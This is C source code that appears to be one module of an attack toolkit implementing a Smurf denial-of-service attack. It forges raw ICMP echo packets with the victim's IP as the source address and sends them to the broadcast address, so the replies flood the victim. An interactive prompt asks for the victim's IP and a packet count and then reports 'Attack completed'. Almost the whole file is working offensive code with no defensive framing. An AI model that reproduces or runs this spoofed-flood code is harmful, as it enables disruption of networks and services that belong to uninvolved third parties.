#include <stdio.h>	
#include <string.h>
#include <sys/socket.h>	
#include <stdlib.h> 
#include <errno.h> //For errno - the error number
#include <netinet/udp.h>	//Provides declarations for udp header
#include <netinet/ip.h>	//Provides declarations for ip header
#include <arpa/inet.h>
#include <time.h>
#include <unistd.h>
#include <linux/icmp.h> 
#include "utilities.h"

void smurf(char * victimIP, int victimPort, int broadcast, int nPackets){

	//initialize random rumber generator
	time_t t;
	srand((unsigned) time(&t));

    //Create a raw socket of type IPPROTO
	int s = socket (AF_INET, SOCK_RAW, IPPROTO_RAW);
	
	if(s == -1)
	{
		//socket creation failed, may be because of non-root privileges
		perror("Failed to create raw socket");
		exit(1);
	}
	
	//Datagram to represent the packet
	unsigned char packet[40000] , source_ip[32] , *data , *pseudogram;
	
	
	//zero out the packet buffer
	memset (packet, 0, 40000);
	
	//IP header
	struct iphdr *iph = (struct iphdr *) packet;
	struct icmphdr* icmp = (struct icmphdr *) (packet + sizeof (struct iphdr));	
	struct sockaddr_in sin;

	icmp -> type = ICMP_ECHO;
	icmp -> code = 0;
	icmp -> un.echo.id = rand();
	icmp -> un.echo.sequence = 0;
	icmp -> checksum = csum((unsigned short *)icmp, sizeof(struct icmphdr));
		
	strcpy(source_ip , victimIP);
	
	sin.sin_family = AF_INET;
	
	
	//Fill in the IP Header
	iph -> ihl = 5;
	iph -> version = 4;
	iph -> tos = 0;
	
	iph -> id = htonl (54321);	//Id of this packet
	iph -> frag_off = 0;
	iph -> ttl = 255;
	iph -> protocol = IPPROTO_ICMP;
	iph -> check = 0;		//Set to 0 before calculating checksum
	iph -> saddr = inet_addr ( source_ip );	//Spoof the source ip address
	iph -> check = 0;
	iph -> daddr = inet_addr("255.255.255.255");
	iph->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr); 
	iph->check = csum ((unsigned short *) packet, iph->tot_len);

	int nPacketsSent = 0;


	if (broadcast){
		//send broadcast icmp echo packets
		//craft packet
		//printf('Broadcast : %s\n', inet_ntoa (iph -> daddr));
		
		
		while (nPackets--){
			//send packet
			if (sendto (s, packet, iph->tot_len ,	0, (struct sockaddr *) &sin, sizeof (sin)) < 0)
			{
				perror("sendto failed");
			}
			//Data send successfully
			else
			{
				nPacketsSent++;
			}
		}
	}
	else{
		//read from file and send icmp echo requests to the ips

	}

    close(s);
	printf("Attack completed. %d packets sent.\n", nPacketsSent);

}

void smurf_setup(){

	system("clear");
	printf("\033[01;33m"); //set color to yellow
	printf("IࠥPࠥ ࠥSࠥMࠥUࠥRࠥFࠥ ࠥAࠥTࠥTࠥCࠥKࠥ\n");
	printf("\033[0m");//reset color
	
	while ((getchar()) != '\n'); //clear out buffer

	char victimIp[32];
	int victimPort = 0;
	int broadCast = 1;
	int nPackets;


	printf ("Enter victim's IP : ");
	fgets(victimIp, 32, stdin);
	victimIp[strcspn(victimIp, "\n")] = 0;

	printf ("Enter victim's port : ");
	scanf ("%d", &victimPort);

	printf ("Use broadcast IP? (1 for yes / 0 for no): ");
	scanf ("%d", &broadCast);

	printf ("Enter number of packets to send : ");
	scanf ("%d", &nPackets);
	//TODO read ip from list instead of using broadcast address
	broadCast = 1;
    smurf(victimIp, victimPort, broadCast, nPackets);
}